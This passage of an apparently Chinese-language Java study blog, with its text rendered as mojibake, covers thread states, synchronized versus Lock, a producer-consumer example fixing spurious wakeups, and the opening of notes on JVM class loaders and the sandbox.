<p>å¹¶å‘ç¼–ç¨‹çš„æœ¬è´¨ï¼š<strong>å……åˆ†åˆ©ç”¨CPUçš„èµ„æº</strong></p>
<h1 id="3ã€å›é¡¾å¤šçº¿ç¨‹"><a href="#3ã€å›é¡¾å¤šçº¿ç¨‹" class="headerlink" title="3ã€å›é¡¾å¤šçº¿ç¨‹"></a>3ã€å›é¡¾å¤šçº¿ç¨‹</h1><p>çº¿ç¨‹æœ‰å‡ ä¸ªçŠ¶æ€ â€“ 6ç§   ç›´æ¥å°±æ˜¯èƒ½å¤Ÿçœ‹æºç </p>
<pre><code>public enum State &#123;
    /**
     * æ–°å»º
     */
    NEW,

    /**
     * è¿è¡Œ
     */
    RUNNABLE,

    /**
     * é˜»å¡
     */
    BLOCKED,

    /**
     * ç­‰å¾…ï¼Œæ­»æ­»çš„ç­‰
     */
    WAITING,

    /**
     * è¶…æ—¶ç­‰å¾…
     */
    TIMED_WAITING,

    /**
     * åœæ­¢
     */
    TERMINATED;
&#125;
</code></pre>
<blockquote>
<p>waitå’Œsleepçš„åŒºåˆ«</p>
</blockquote>
<ol>
<li><p>æ¥è‡ªä¸åŒçš„ç±»</p>
<ul>
<li><p>waitâ€”-&gt;Object</p>
</li>
<li><p>sleepâ€”-&gt;Thread</p>
</li>
</ul>
</li>
<li><p>å…³äºé”çš„é‡Šæ”¾</p>
<ul>
<li>waitä¼šé‡Šæ”¾é”</li>
<li>sleepä¸ä¼šé‡Šæ”¾é”ï¼ŒæŠ±ç€é”ç¡è§‰</li>
</ul>
</li>
<li><p>ä½¿ç”¨çš„èŒƒå›´æ˜¯ä¸åŒçš„</p>
<ul>
<li>waitå¿…é¡»åœ¨åŒæ­¥ä»£ç å—ä¸­</li>
<li>sleepå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ç¡</li>
</ul>
</li>
</ol>
<h1 id="4ã€ä¼ ç»Ÿçš„Synchronizedé”"><a href="#4ã€ä¼ ç»Ÿçš„Synchronizedé”" class="headerlink" title="4ã€ä¼ ç»Ÿçš„Synchronizedé”"></a>4ã€ä¼ ç»Ÿçš„Synchronizedé”</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUCDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Ticket</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (number &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;ä¹°äº†ç¬¬&quot;</span> + (number--) + <span class="string">&quot;å¼ ç¥¨&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/c64f5494484b8e7234a3701e9859968e--6fcc--image-20241007145819476.png" alt="image-20241007145819476"></p>
<h1 id="5ã€Locké”"><a href="#5ã€Locké”" class="headerlink" title="5ã€Locké”"></a>5ã€Locké”</h1><p>åŠ é”ï¼Œé‡Šæ”¾é”</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/31d30e67e91ca403f77b1d79ff83854f--4308--image-20241007150354933.png" alt="image-20241007150354933"></p>
<p>å®ç°ç±»ï¼ˆå¯é‡å…¥é”ï¼Œè¯»é”ï¼Œå†™é”ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/31664e900c7c465ea6434932a42d1e4f--c0fd--image-20241007150402819.png" alt="image-20241007150402819"></p>
<p>å¯é‡å…¥é”æ„é€ æ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/fc7c55397daed14671d863d701b29fd5--b6f6--image-20241007150515820.png" alt="image-20241007150515820"></p>
<p>å…¬å¹³é”ï¼šååˆ†å…¬å¹³ï¼Œå¯ä»¥å…ˆæ¥ååˆ°</p>
<p>éå…¬å¹³é”ï¼šååˆ†ä¸å…¬å¹³ï¼Œå¯ä»¥æ’é˜Ÿï¼ˆé»˜è®¤ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.Lock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUCDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Ticket2</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">                ticket.sale();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.åˆ›å»ºé” Lock lock = new ReentrantLock();</span></span><br><span class="line"><span class="comment"> * 2.åŠ é” lock.lock();</span></span><br><span class="line"><span class="comment"> * 3.é‡Šæ”¾é” lock.unlock();</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ›å»ºé”</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//åŠ é”</span></span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;ä¹°äº†ç¬¬&quot;</span> + (number--) + <span class="string">&quot;å¼ ç¥¨&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//é‡Šæ”¾é”</span></span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6ã€Synchronizedå’ŒLockåŒºåˆ«"><a href="#6ã€Synchronizedå’ŒLockåŒºåˆ«" class="headerlink" title="6ã€Synchronizedå’ŒLockåŒºåˆ«"></a>6ã€Synchronizedå’ŒLockåŒºåˆ«</h1><ol>
<li>Synchronized å†…ç½®çš„javaå…³é”®å­—ï¼ŒLockæ˜¯ä¸€ä¸ªjavaç±»</li>
<li>Synchronized æ— æ³•åˆ¤æ–­è·å–é”çš„çŠ¶æ€ï¼ŒLockå¯ä»¥åˆ¤æ–­æ˜¯å¦è·å–åˆ°äº†é”</li>
<li>Synchronized ä¼šè‡ªåŠ¨é‡Šæ”¾é”ï¼ŒLockå¿…é¡»æ‰‹åŠ¨é‡Šæ”¾é”ï¼Œå¦‚æœä¸é‡Šæ”¾é”ï¼Œä¼šå¯¼è‡´æ­»é”ï¼</li>
<li>Synchronized çº¿ç¨‹1ï¼ˆè·å¾—é”ï¼Œé˜»å¡ï¼‰ã€çº¿ç¨‹2ï¼ˆç­‰å¾…ï¼Œå‚»å‚»çš„ç­‰ï¼‰ï¼›Lockå°±ä¸ä¸€å®šä¼šç­‰å¾…ä¸‹å»</li>
<li>Synchronizedï¼Œå¯é‡å…¥é”ï¼Œä¸å¯ä»¥ä¸­æ–­ï¼Œéå…¬å¹³ï¼›Lockï¼Œå¯é‡å…¥é”ï¼Œå¯ä»¥åˆ¤æ–­é”ï¼Œéå…¬å¹³ï¼ˆè‡ªå·±å¯ä»¥è®¾ç½®ï¼‰</li>
<li>Synchronized ä½¿ç”¨é”å°‘é‡çš„ä»£ç åŒæ­¥é—®é¢˜ï¼ŒLocké€‚åˆé”å¤§é‡çš„åŒæ­¥ä»£ç </li>
</ol>
<h1 id="7ã€ä¼ ç»Ÿçš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ï¼Œé˜²æ­¢è™šå‡å”¤é†’"><a href="#7ã€ä¼ ç»Ÿçš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ï¼Œé˜²æ­¢è™šå‡å”¤é†’" class="headerlink" title="7ã€ä¼ ç»Ÿçš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ï¼Œé˜²æ­¢è™šå‡å”¤é†’"></a>7ã€ä¼ ç»Ÿçš„ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ï¼Œé˜²æ­¢è™šå‡å”¤é†’</h1><blockquote>
<p>ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…é—®é¢˜ Synchronized ç‰ˆæœ¬</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUCDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Data</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.increment();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.decrement();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (number != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//ç­‰å¾…</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number++;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//é€šçŸ¥å…¶ä»–çº¿ç¨‹ï¼Œæˆ‘+1å®Œæ¯•äº†</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">decrement</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//ç­‰å¾…</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number--;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//é€šçŸ¥å…¶ä»–çº¿ç¨‹ï¼Œæˆ‘-1å®Œæ¯•äº†</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/976a1f91671bb25cb52b52043dcb8113--adf1--image-20241007204343421.png" alt="image-20241007204343421"></p>
<p>é—®é¢˜å­˜åœ¨ï¼Œå¦‚æœæ˜¯A B C D å››ä¸ªçº¿ç¨‹ï¼ˆå¯èƒ½ä¸ä¼šå‡ºç°ä¸Šé¢é¢„æœŸçš„ç»“æœï¼Œå¯èƒ½æ˜¯æœ‰2,3å‡ºç°ï¼‰  -ã€‹ è™šå‡å”¤é†’</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/7f842efd6b130dc531b89023ae585232--34bd--image-20241007204432193.png" alt="image-20241007204432193"></p>
<p><strong>è§£å†³ï¼šæŠŠif æ”¹æˆwhile</strong></p>
<p>ç”¨ifåˆ¤æ–­çš„è¯ï¼Œå”¤é†’åçº¿ç¨‹ä¼šä»waitä¹‹åçš„ä»£ç å¼€å§‹è¿è¡Œï¼Œä½†æ˜¯ä¸ä¼šé‡æ–°åˆ¤æ–­ifæ¡ä»¶ï¼Œç›´æ¥ç»§ç»­è¿è¡Œifä»£ç å—ä¹‹åçš„ä»£ç ï¼Œè€Œå¦‚æœä½¿ç”¨whileçš„è¯ï¼Œä¹Ÿä¼šä»waitä¹‹åçš„ä»£ç è¿è¡Œï¼Œä½†æ˜¯å”¤é†’åä¼šé‡æ–°åˆ¤æ–­å¾ªç¯æ¡ä»¶ï¼Œå¦‚æœä¸æˆç«‹å†æ‰§è¡Œwhileä»£ç å—ä¹‹åçš„ä»£ç å—ï¼Œæˆç«‹çš„è¯ç»§ç»­waitã€‚</p>
<p>æ‹¿ä¸¤ä¸ªåŠ æ³•çº¿ç¨‹Aã€Cæ¥è¯´ï¼Œæ¯”å¦‚Aå…ˆæ‰§è¡Œï¼Œæ‰§è¡Œæ—¶è°ƒç”¨äº†waitæ–¹æ³•ï¼Œé‚£å®ƒä¼šç­‰å¾…ï¼Œæ­¤æ—¶ä¼šé‡Šæ”¾é”ï¼Œé‚£ä¹ˆçº¿ç¨‹Cè·å¾—é”å¹¶ä¸”ä¹Ÿä¼šæ‰§è¡Œwaitæ–¹æ³•ï¼Œä¸¤ä¸ªåŠ çº¿ç¨‹ä¸€èµ·ç­‰å¾…è¢«å”¤é†’ã€‚æ­¤æ—¶å‡çº¿ç¨‹ä¸­çš„æŸä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå®Œæ¯•å¹¶ä¸”å”¤é†’äº†è¿™ä¿©åŠ çº¿ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¿©åŠ çº¿ç¨‹ä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Œå…¶ä¸­Aè·å–äº†é”å¹¶ä¸”åŠ 1ï¼Œæ‰§è¡Œå®Œæ¯•ä¹‹åCå†æ‰§è¡Œã€‚å¦‚æœæ˜¯ifçš„è¯ï¼Œé‚£ä¹ˆAä¿®æ”¹å®Œnumåï¼ŒCä¸ä¼šå†å»åˆ¤æ–­numçš„å€¼ï¼Œç›´æ¥ä¼šç»™num+1ã€‚å¦‚æœæ˜¯whileçš„è¯ï¼ŒAæ‰§è¡Œå®Œä¹‹åï¼ŒCè¿˜ä¼šå»åˆ¤æ–­numçš„å€¼ï¼Œå› æ­¤å°±ä¸ä¼šæ‰§è¡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Data</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.increment();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.decrement();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.increment();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.decrement();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;D&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (number != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//ç­‰å¾…</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number++;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//é€šçŸ¥å…¶ä»–çº¿ç¨‹ï¼Œæˆ‘+1å®Œæ¯•äº†</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">decrement</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//ç­‰å¾…</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number--;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//é€šçŸ¥å…¶ä»–çº¿ç¨‹ï¼Œæˆ‘-1å®Œæ¯•äº†</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JVMå­¦ä¹ </title>
    <url>/2024/09/29/JVM%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>è®°å½•å­¦ä¹ Java JVM</p>
<span id="more"></span>

<h1 id="ä¸€ã€JVMçš„å­¦ä¹ æ–¹å¼"><a href="#ä¸€ã€JVMçš„å­¦ä¹ æ–¹å¼" class="headerlink" title="ä¸€ã€JVMçš„å­¦ä¹ æ–¹å¼"></a>ä¸€ã€JVMçš„å­¦ä¹ æ–¹å¼</h1><ul>
<li>è¯·ä½ è°ˆè°ˆä½ å¯¹JVMçš„ç†è§£ï¼Ÿjava8è™šæ‹Ÿæœºå’Œä¹‹å‰çš„å˜åŒ–æ›´æ–°ï¼Ÿ</li>
<li>ä»€ä¹ˆæ˜¯OOMï¼Ÿä»€ä¹ˆæ˜¯æ ˆæº¢å‡ºï¼Ÿæ€ä¹ˆåˆ†æï¼Ÿ</li>
<li>JVMçš„å¸¸ç”¨è°ƒä¼˜å‚æ•°æœ‰å“ªäº›ï¼Ÿ</li>
<li>å†…å­˜å¿«ç…§å¦‚ä½•æŠ“å–ï¼Œæ€ä¹ˆåˆ†æDumpæ–‡ä»¶ï¼Ÿ</li>
<li>è°ˆè°ˆJVMä¸­ï¼Œç±»åŠ è½½å™¨çš„è®¤è¯†ï¼Ÿ</li>
</ul>
<ol>
<li>JVMçš„ä½ç½®</li>
<li>JVMçš„ä½“ç³»ç»“æ„</li>
<li>ç±»åŠ è½½å™¨</li>
<li>åŒäº²å§”æ´¾æœºåˆ¶</li>
<li>æ²™ç®±å®‰å…¨æœºåˆ¶</li>
<li>Native</li>
<li>PCå¯„å­˜å™¨</li>
<li>æ–¹æ³•åŒº</li>
<li>æ ˆ</li>
<li>ä¸‰ç§JVM</li>
<li>å †</li>
<li>æ–°ç”ŸåŒºã€è€å¹´åŒº</li>
<li>æ°¸ä¹…åŒº</li>
<li>å †å†…å­˜è°ƒä¼˜</li>
<li>GC<ol>
<li>å¸¸ç”¨ç®—æ³•</li>
</ol>
</li>
<li>JMM</li>
<li>æ€»ç»“</li>
</ol>
<h1 id="äºŒã€JVMçš„ä½“ç³»ç»“æ„"><a href="#äºŒã€JVMçš„ä½“ç³»ç»“æ„" class="headerlink" title="äºŒã€JVMçš„ä½“ç³»ç»“æ„"></a>äºŒã€JVMçš„ä½“ç³»ç»“æ„</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/15f08b83cc36ebf5ba8c33bb4ca72c5c--fe5c--image-20241001184024276.png" alt="image-20241001184024276"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/2849f9431c9f35342055f25d9f9b4a7e--7c8c--image-20241001190719023.png" alt="image-20241001190719023"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/d1c23d6bb7bb20a3555f7a846826726f--6967--image-20241001190723436.png" alt="image-20241001190723436"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/360e596935f9e9d5556a8af031f0b6a0--ae8f--image-20241001190940381.png" alt="image-20241001190940381"></p>
<h1 id="ä¸‰ã€ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾æœºåˆ¶"><a href="#ä¸‰ã€ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="ä¸‰ã€ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾æœºåˆ¶"></a>ä¸‰ã€ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾æœºåˆ¶</h1><p>ä½œç”¨ï¼šåŠ è½½Classæ–‡ä»¶ </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/8c000f95eebb45566d18867ed7a0aac3--536f--image-20241001191035701.png" alt="image-20241001191035701"></p>
<ol>
<li>è™šæ‹Ÿæœºè‡ªå¸¦çš„åŠ è½½å™¨</li>
<li>å¯åŠ¨ç±»ï¼ˆæ ¹ï¼‰åŠ è½½å™¨ï¼ˆ<strong>BootstrapClassLoader</strong>ï¼‰</li>
<li>æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆ<strong>ExtClassLoader</strong>ï¼‰</li>
<li>åº”ç”¨ç¨‹åºï¼ˆç³»ç»Ÿç±»ï¼‰åŠ è½½å™¨ï¼ˆ<strong>AppClassLoader</strong>ï¼‰</li>
</ol>
<h1 id="å››ã€Javaå†å²-æ²™ç®±å®‰å…¨æœºåˆ¶"><a href="#å››ã€Javaå†å²-æ²™ç®±å®‰å…¨æœºåˆ¶" class="headerlink" title="å››ã€Javaå†å²-æ²™ç®±å®‰å…¨æœºåˆ¶"></a>å››ã€Javaå†å²-æ²™ç®±å®‰å…¨æœºåˆ¶</h1><p>javaå®‰å…¨æ¨¡å‹çš„æ ¸å¿ƒå°±æ˜¯javaæ²™ç®±ï¼ˆsandboxï¼‰</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯æ²™ç®±?</p>
</blockquote>
<p>æ²™ç®±æ˜¯ä¸€ä¸ªé™åˆ¶ç¨‹åºè¿è¡Œçš„ç¯å¢ƒã€‚</p>
<p>æ²™ç®±æœºåˆ¶å°±æ˜¯å°†javaä»£ç é™å®šåœ¨è™šæ‹Ÿæœºï¼ˆJVMï¼‰ç‰¹å®šçš„è¿è¡ŒèŒƒå›´ä¸­ï¼Œå¹¶ä¸”ä¸¥æ ¼é™åˆ¶ä»£ç å¯¹æœ¬åœ°ç³»ç»Ÿèµ„æºçš„è®¿é—®ï¼Œé€šè¿‡è¿™æ ·çš„æªæ–½æ¥ä¿è¯å¯¹ä»£ç çš„æœ‰æ•ˆéš”ç¦»ã€‚é˜²æ­¢å¯¹æœ¬åœ°ç³»ç»Ÿé€ æˆç ´åã€‚æ²™ç®±ä¸»è¦é™åˆ¶ç³»ç»Ÿèµ„æºè®¿é—®ã€‚</p>
